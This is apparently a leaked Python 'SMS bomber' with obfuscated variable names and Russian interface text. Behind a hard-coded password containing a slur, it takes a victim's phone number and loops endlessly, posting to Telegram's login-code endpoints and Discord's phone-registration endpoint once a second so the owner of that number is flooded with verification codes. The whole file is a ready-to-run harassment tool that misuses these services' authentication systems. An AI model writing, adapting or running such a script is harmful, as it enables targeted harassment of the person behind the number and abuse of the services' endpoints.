import time
import requests
from colorama import Fore ,init
init (autoreset =True ,convert =True )
headers ={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Content-Type':'application/x-www-form-urlencoded'}#line:10:}
def perform_attack (OOOO0000O00000000 ):
    O0OOOOO000OO0O000 =0
    try :
        while True :
            time .sleep (1)
            O00000O0O0O0OO00O =requests .post ('https://my.telegram.org/auth/send_password',headers =headers ,data ={'phone':OOOO0000O00000000 })
            OOO0000000O0O00OO =requests .post ('https://my.telegram.org/auth/',headers =headers ,data ={'phone':OOOO0000O00000000 })
            O0OOO0OO0O0000O00 =requests .post ('https://my.telegram.org/auth/send_password',headers =headers ,data ={'phone':OOOO0000O00000000 })
            O0OOOO0OO0OO00OO0 =requests .get ('https://telegram.org/support?setln=ru',headers =headers )
            O0OO0O0O0O000000O =requests .post ('https://my.telegram.org/auth/',headers =headers ,data ={'phone':OOOO0000O00000000 })
            O0OO0O00000O000O0 =requests .post ('https://discord.com/api/v9/auth/register/phone',headers =headers ,data ={"phone":OOOO0000O00000000 })
            O0OOOOO000OO0O000 +=1
            print (Fore .WHITE +f"[fck] Коды и жалобы успешно отправлены!")
            print (Fore .WHITE +f"[fck] Всего кругов отправлено: {O0OOOOO000OO0O000}")
    except Exception as OO0OOO0O000O0O0O0 :
        print (Fore .RED +f'Произошла ошибка: {OO0OOO0O000O0O0O0}')
print (Fore .WHITE +"Введи текстовый пароль для запуска программы:")
while True :
    key =input ()
    if key =="omonGAY":
        print (Fore .GREEN +'Пароль верен! Запускаю работу программы!')
        time .sleep (2 )
        print (Fore .MAGENTA +'''
┏━━━┳┓╋┏┳━━━┳┓┏━┓┏━━━━┳━━━┓
┃┏━━┫┃╋┃┃┏━┓┃┃┃┏┛┃┏┓┏┓┃┏━┓┃
┃┗━━┫┃╋┃┃┃╋┗┫┗┛┛╋┗┛┃┃┗┫┃╋┗┛
┃┏━━┫┃╋┃┃┃╋┏┫┏┓┃╋╋╋┃┃╋┃┃┏━┓
┃┃╋╋┃┗━┛┃┗━┛┃┃┃┗┓╋╋┃┃╋┃┗┻━┃
┗┛╋╋┗━━━┻━━━┻┛┗━┛╋╋┗┛╋┗━━━┛
''')
        print ("[fck] Sliv by @multures")
        print (Fore .WHITE +"[fck] Введите номер телефона:")
        number =input ()
        perform_attack (number )
        break
    else :
        print (Fore .YELLOW +"Неверный ключ. Попробуйте еще раз.")